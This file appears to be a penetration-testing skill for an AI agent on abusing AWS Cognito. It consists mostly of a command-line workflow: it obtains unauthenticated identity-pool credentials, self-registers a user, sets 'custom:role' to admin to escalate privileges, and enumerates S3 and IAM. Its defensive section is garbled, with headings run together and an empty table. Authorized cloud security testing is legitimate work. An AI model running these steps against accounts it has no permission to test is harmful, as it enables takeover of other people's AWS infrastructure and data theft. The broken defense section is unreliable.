---
name: aws-cognito-abuse
description: >
  Exploit misconfigurations in AWS Cognito, specifically focusing on unauthorized identity pool access, 
  user pool self-registration issues, and privilege escalation via custom attributes to access broader 
  AWS infrastructure.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0004, TA0006]
  techniques: [T1199, T1078, T1098]
platforms: [aws, web]
tags: [aws, cognito, cloud-security, iam, serverless, privilege-escalation, pentesting]
tools: [aws-cli, pacu, burp-suite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AWS Cognito Abuse

## When to Use
- When testing applications hosted on AWS that utilize Amazon Cognito for user authentication (User Pools) and authorization (Identity Pools).
- To demonstrate how improper attribute mapping or overly permissive unauthenticated roles in Cognito can lead to full AWS account compromise.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying Cognito Parameters

```bash
# grep -r "us-east-1:[0-9a-fA-F-]*" .
```

### Phase 2: Exploiting Identity Pools (Unauthenticated Access)

```bash
# aws cognito-identity get-id --identity-pool-id "us-east-1:xxxx-xxxx-xxxx" --region us-east-1

# aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:yyyy-yyyy-yyyy" --region us-east-1

# export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

### Phase 3: Exploiting User Pools (Self-Registration & Attributes)

```bash
# aws cognito-idp sign-up --client-id xxx --username testuser@hacker.com --password "Password123!"

# aws cognito-idp update-user-attributes --access-token yyy --user-attributes Name="custom:role",Value="admin"
```

### Phase 4: Exploiting IAM Privileges

```bash
# aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover Pool IDs ] --> B{Identity Pool Access? ]}
    B -->|Yes| C[Get Temporary AWS Credentials ]
    B -->|No| D[Analyze User Pool ]
    C --> E[Enumerate AWS Environment ]
```

## 🔵 Blue Team Detection & Defense
- **Disable Unauthenticated Access**: **Attribute Write Permissions**: **Least Privilege IAM**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Aws Cognito Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Notion Security: [Cognito Security Misconfigurations](https://notion.so/security)
- AWS Docs: [Amazon Cognito Authentication Flow](https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html)
